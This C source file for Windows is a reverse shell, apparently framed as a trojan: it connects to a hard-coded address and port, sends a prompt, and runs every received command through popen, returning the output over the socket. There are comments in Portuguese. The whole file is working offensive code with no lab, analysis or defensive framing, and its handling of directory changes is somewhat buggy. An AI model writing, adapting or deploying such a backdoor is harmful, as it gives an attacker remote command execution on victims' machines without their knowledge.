#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

#define B 1024
#define DIR 256
#define True 1

int trojanExec(int s);

int main(){

	WSADATA wsa;
	int erro = WSAStartup(MAKEWORD(2, 2), &wsa);
	if (erro != 0){
		printf("WSAStartup Error: %d\n", erro);
		return 1;
	}

	char *ip = "192.168.1.104";
	int port = 777;

	struct sockaddr_in server;
		server.sin_family = AF_INET;
		server.sin_addr.s_addr = inet_addr(ip);
		server.sin_port = htons(port);

	int s = socket(AF_INET, SOCK_STREAM, 0); // TCP/IP
	if (s == -1){
		printf("Socket Error\n");
		return 1;
	}

	erro = connect(s, (struct sockaddr *)&server, sizeof(server));
	if (erro < 0){
		closesocket(s);
		printf("Connection Error\n");
		return 1;
	}

	char recvbuf[B], cwd[DIR];
	char *shell = "$>";
	char *cd;
	FILE *fp;
	char path[MAX_PATH];
	int status;
	char *aux;

	while (True){

		erro = send(s, shell, (int)strlen(shell), 0);
		if (erro < 0){
			printf("Send Error\n");
			return 1;
		}

		erro = recv(s, recvbuf, B, 0);
		if (erro < 0){
			printf("Recv Error\n");
			return 2;
		}

			if ((strstr(recvbuf, "cd")-recvbuf) == 0){
				cd = strtok(strchr(recvbuf, 32), " ");

				if ((aux=strchr(cd, '\n')) != NULL){
				    *aux = '\0';
				}
				
				if (chdir(cd) != 0){
					perror("chdir() error()");
				}
				else {
					if (getcwd(cwd, sizeof(cwd)) == NULL){
						perror("getcwd() error");
					}
					else {
						printf("current working directory is: %s\n", cwd);
						//erro = send(s, cwd, (int)strlen(cwd), 0);
					}
				}
			}

			fp = popen(recvbuf, "r");

			while (fgets(path, PATH_MAX, fp) != NULL){
				erro = send(s, path, (int)strlen(path), 0);
			}

			status = pclose (fp);

			printf("status : %d\n", status);

			if (status == -1) {
			    printf("Erro relatado por pclose ()\n");
			    return 1;
			} else {
			    /* Use macros descritas em wait () para inspecionar 'status' em ordem
			       determinar o sucesso / falha do comando executado por popen () */
		    }
	}


closesocket(s);

return 0;
}
